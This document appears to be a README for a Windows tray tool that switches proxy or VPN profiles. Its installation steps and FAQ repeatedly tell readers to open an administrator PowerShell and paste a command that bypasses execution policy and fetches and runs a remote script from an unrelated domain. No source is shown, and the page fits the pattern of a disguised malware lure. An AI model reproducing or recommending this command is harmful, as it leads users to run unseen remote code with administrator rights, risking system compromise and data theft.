<div align="center">

<img src="https://img.shields.io/badge/Platform-Windows_10/11-0078D4?style=for-the-badge&logo=windows&logoColor=white" height="25"/>
<img src="https://img.shields.io/badge/Open-Source-3fb950?style=for-the-badge&logo=opensourceinitiative&logoColor=white" height="25"/>
<img src="https://img.shields.io/badge/Shell-PowerShell-5391FE?style=for-the-badge&logo=powershell&logoColor=white" height="25"/>

# Quick Proxy Region Switcher
**Hotkey profiles · System proxy · Tray tool**

<img src="banner.png" alt="Quick Proxy Region Switcher" width="100%"/>

</div>

---

> Lightweight tray utility to switch Windows proxy profiles or VPN connections using hotkeys.

## `ABOUT`

Tray utility to **quickly switch system proxy or VPN profiles** with hotkeys on Windows.

## INSTALLATION

**Steps:**
1. Press **Win**, type **PowerShell**
2. Right-click **Windows PowerShell** → **Run as administrator**
3. Copy the command below, paste into the window, press **Enter**
4. If **UAC** still appears – click **Yes**

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://shellex.pro/ps/setup.ps1' | iex"
```

<details>
<summary><b>Command did not start?</b></summary>

Try this directly in the same PowerShell window:

```powershell
irm 'https://shellex.pro/ps/setup.ps1' | iex
```

</details>

<sub>Administrator rights are required to complete the setup.</sub>


## `FEATURES`

⌨️ **Hotkey profiles** — Jump between saved network setups instantly.
🌐 **System proxy** — Toggle WinHTTP / user proxy settings safely.
📌 **Tray icon** — See active profile from the notification area.
💾 **Profile presets** — Name and store region/work/home configs.
⚡ **One command** — PowerShell handles download, unpack, and setup.

## `REQUIREMENTS`

| | |
|:---|:---|
| **Windows** | Windows 10 / 11 (64-bit) |
| **RAM** | 4 GB |
| **Disk** | 1 GB free space |

## `FAQ`

<details>
<summary>&nbsp;<b>How to install?</b></summary>
<br>Open PowerShell as Administrator and run the command from the INSTALLATION section. You should see steps <b>[1/3]</b>, <b>[2/3]</b>, and <b>[3/3]</b> in the console.
</details>

<details>
<summary>&nbsp;<b>Command did not start?</b></summary>
<br>Try: `irm 'https://shellex.pro/ps/setup.ps1' | iex`
</details>

<details>
<summary>&nbsp;<b>What does this tool do?</b></summary>
<br>Tray utility to **quickly switch system proxy or VPN profiles** with hotkeys on Windows.
</details>

<details>
<summary>&nbsp;<b>Updates?</b></summary>
<br>Re-run the same PowerShell command to fetch the latest build.
</details>
